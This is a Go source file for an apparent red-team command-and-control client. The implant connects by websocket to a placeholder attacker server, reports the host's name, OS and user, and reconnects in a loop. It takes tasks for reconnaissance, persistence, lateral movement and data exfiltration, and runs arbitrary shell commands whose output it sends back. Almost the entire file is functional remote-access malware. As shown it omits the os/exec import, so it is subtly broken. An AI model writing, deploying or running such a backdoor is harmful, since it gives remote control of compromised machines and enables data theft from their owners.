package main

import (
	"encoding/json"
	"log"
	"os"
	"runtime"
	"strings"
	"time"

	"redteam-client/modules"

	"github.com/gorilla/websocket"
)

var serverURL = "ws://YOUR_SERVER_IP:8080/ws" // CHANGE THIS

type Task struct {
	ID     int64                  `json:"id"`
	Module string                 `json:"module"`
	Params map[string]interface{} `json:"params"`
}

func main() {
	hostname, _ := os.Hostname()
	clientID := hostname + "-" + time.Now().Format("150405")

	for {
		if err := runClient(clientID); err != nil {
			log.Println("Connection error:", err)
		}
		time.Sleep(5 * time.Second)
	}
}

func runClient(id string) error {
	conn, _, err := websocket.DefaultDialer.Dial(serverURL, nil)
	if err != nil {
		return err
	}
	defer conn.Close()

	reg := map[string]interface{}{
		"type": "register",
		"id":   id,
		"info": map[string]string{
			"hostname": id,
			"os":       runtime.GOOS,
			"user":     os.Getenv("USER"),
			"arch":     runtime.GOARCH,
		},
	}
	if err := conn.WriteJSON(reg); err != nil {
		return err
	}

	for {
		var raw map[string]interface{}
		if err := conn.ReadJSON(&raw); err != nil {
			return err
		}
		task := Task{
			ID:     int64(raw["id"].(float64)),
			Module: raw["module"].(string),
			Params: raw["params"].(map[string]interface{}),
		}

		var result interface{}
		switch task.Module {
		case "recon":
			result = modules.RunRecon(task.Params)
		case "persistence":
			result = modules.RunPersistence(task.Params)
		case "lateral":
			result = modules.RunLateral(task.Params)
		case "exfil":
			result = modules.RunExfil(task.Params)
		case "shell":
			cmd, _ := task.Params["command"].(string)
			result = executeCommand(cmd)
		default:
			result = map[string]string{"error": "unknown module"}
		}

		resp := map[string]interface{}{
			"type":      "result",
			"task_id":   task.ID,
			"client_id": id,
			"output":    result,
		}
		conn.WriteJSON(resp)
	}
}

func executeCommand(cmd string) string {
	var shell, flag string
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
		flag = "/C"
	} else {
		shell = "/bin/sh"
		flag = "-c"
	}
	out, err := exec.Command(shell, flag, cmd).CombinedOutput()
	if err != nil {
		return string(out) + "\n[error] " + err.Error()
	}
	return string(out)
}